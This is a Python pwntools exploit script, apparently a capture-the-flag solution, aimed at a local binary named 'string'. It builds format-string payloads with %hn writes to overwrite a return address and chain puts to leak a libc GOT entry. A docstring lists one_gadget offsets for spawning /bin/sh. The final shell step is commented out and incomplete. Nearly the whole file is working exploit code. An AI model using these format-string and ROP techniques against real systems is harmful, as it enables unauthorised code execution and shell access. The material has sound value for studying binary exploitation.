from pwn import *
context.update(log_level = 'debug')
'''
0x3a80c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3a80e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3a812 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3a819 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5f065 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5f066 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''
rest = ''
c = 0
def fmt(addr, data):
	global rest, c
	offset = len(rest)/4 + 5
	payload = p32(addr) + p32(addr+2)
	low = data & 0xffff
	high = data >> 16
	payload += '%{}c'.format(0x10000 -c - 8 + low) + '%{}$hn'.format(offset)
	c = low
	payload += '%{}c'.format(0x10000 - c + high) + '%{}$hn'.format(offset+1)
	c = high
	padding = 'a'*(4 - (len(payload) % 4))
	c += len(padding)
	payload += padding	
	rest += payload
	return payload

def comu(fmt):
	global rest, c
	rest = ''
	c = 0
	p.sendlineafter('> ', '1')
	p.sendlineafter(': ', fmt)
	p.sendlineafter('> ', '2')
	return p.recvline().split(': ')[1]
p = process('string')
libc = ELF('libc.so.6')
elf = ELF('string')

addr_main = elf.symbols['main']
addr_ret =  int(comu('%3$x'),16) - 0xc
log.info('addr_ret : ' + hex(addr_ret))
log.info('addr_main : ' + hex(addr_main))

addr_plt_puts = elf.plt['puts']
addr_got_puts = elf.got['puts']
raw_input('debug: ' + str(p.pid))
seg = fmt(addr_ret, addr_plt_puts)
seg += fmt(addr_ret+4, addr_main)
seg += fmt(addr_ret+8, addr_got_puts)
print hex(u32(comu(seg)[:4]))
print '#####'
#log.info('addr_libc_puts: ' + hex(addr_libc_puts))
log.info('addr_got_puts: ' + hex(addr_got_puts))
log.info('addr_plt_puts: ' + hex(addr_plt_puts))
log.info('seg: ' + seg)
#addr_libc_puts = int(p.recvline(), 16)
#log.info(hex(addr_libc_puts))
#addr_oneshot = 
#comu(fmt(addr_ret+4, addr_oneshot, 5))
#p.interactive()
